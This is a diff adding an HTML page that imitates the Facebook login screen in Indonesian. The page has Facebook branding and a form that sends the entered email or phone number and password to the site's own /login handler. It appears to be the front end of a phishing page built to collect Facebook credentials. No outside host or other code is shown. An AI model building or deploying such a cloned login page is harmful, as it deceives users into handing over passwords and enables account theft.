@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>Facebook – log in or sign up</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/static/facebook.css">
+</head>
+<body>
+    <div class="container">
+        <div class="left">
+            <h1 class="logo">facebook</h1>
+            <p class="desc">Facebook membantu Anda terhubung dan berbagi dengan orang-orang dalam kehidupan Anda.</p>
+        </div>
+        <div class="right">
+            <form method="POST" action="/login" class="login-form">
+                <input type="text" name="username" placeholder="Email atau Nomor Telepon" required>
+                <input type="password" name="password" placeholder="Kata Sandi" required>
+                <button type="submit">Masuk</button>
+                <a href="#" class="forgot">Lupa kata sandi?</a>
+                <hr>
+                <button type="button" class="create">Buat akun baru</button>
+            </form>
+            <p class="bottom-note">
+                <strong>Buat Halaman</strong> untuk selebriti, merek, atau bisnis.
+            </p>
+        </div>
+    </div>
+</body>
+</html>
